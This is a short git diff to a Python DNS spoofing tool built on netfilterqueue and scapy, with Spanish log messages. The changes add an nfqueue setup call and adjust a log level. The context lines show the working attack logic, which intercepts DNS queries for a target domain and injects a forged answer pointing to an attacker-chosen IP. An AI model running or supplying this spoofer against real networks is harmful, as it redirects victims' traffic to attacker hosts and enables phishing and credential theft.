@@ -5,7 +5,7 @@ import netfilterqueue
 import scapy.all as scapy
 from modules.my_utils import show_message
 from modules.net_utils import get_ip
-from modules.sys_utils import check_root
+from modules.sys_utils import check_root, setup_nfqueue
 from modules.exit_handler import setup_signal_handler
 
 ### Functions #############################################################################################################
@@ -26,7 +26,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname.decode()
 
         if DOMAIN in qname:
-            show_message("Envenenando el dominio: ", "info", DOMAIN)
+            show_message("Envenenando el dominio:", "minus", DOMAIN)
 
             answer = scapy.DNSRR(rrname=qname, rdata=IP)
             scapy_packet[scapy.DNS].an = answer
@@ -46,6 +46,7 @@ def main():
     check_root()
     setup_signal_handler()
     show_message("Executing:", "info", "DNS Spoofer")
+    setup_nfqueue()
 
     global DOMAIN, interface, IP
     DOMAIN, interface = get_arguments()
